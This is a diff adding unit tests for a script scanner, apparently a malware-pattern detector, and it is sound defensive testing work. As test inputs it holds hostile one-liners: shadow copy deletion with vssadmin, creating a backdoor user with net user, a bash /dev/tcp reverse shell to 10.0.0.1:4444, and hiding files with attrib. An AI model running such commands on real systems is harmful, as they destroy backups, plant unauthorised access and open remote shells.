@@ -66,6 +66,24 @@ class ScriptAnalyzerTests(unittest.TestCase):
     def test_batch_rem_comment_not_flagged(self):
         self.assertEqual(scan_text("REM certutil -urlcache x\necho hi", ".bat"), set())
 
+    def test_shadow_copy_deletion_flagged(self):
+        self.assertIn("Shadow copy deletion", scan_text("vssadmin delete shadows /all /quiet"))
+
+    def test_listing_shadow_copies_not_flagged(self):
+        self.assertNotIn("Shadow copy deletion", scan_text("vssadmin list shadows"))
+
+    def test_create_user_account_flagged(self):
+        self.assertIn("Creates user account", scan_text("net user hacker pass123 /add", ".bat"))
+
+    def test_reverse_shell_flagged(self):
+        self.assertIn("Reverse shell", scan_text("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", ".sh"))
+
+    def test_hide_files_flagged(self):
+        self.assertIn("Hides files", scan_text("attrib +h secret.txt", ".bat"))
+
+    def test_eicar_signature_flagged(self):
+        self.assertIn("EICAR test signature", scan_text("EICAR-STANDARD-ANTIVIRUS-TEST-FILE"))
+
     def test_is_script_by_extension(self):
         self.assertTrue(script_analyzer.is_script("run.ps1"))
         self.assertFalse(script_analyzer.is_script("photo.jpg"))
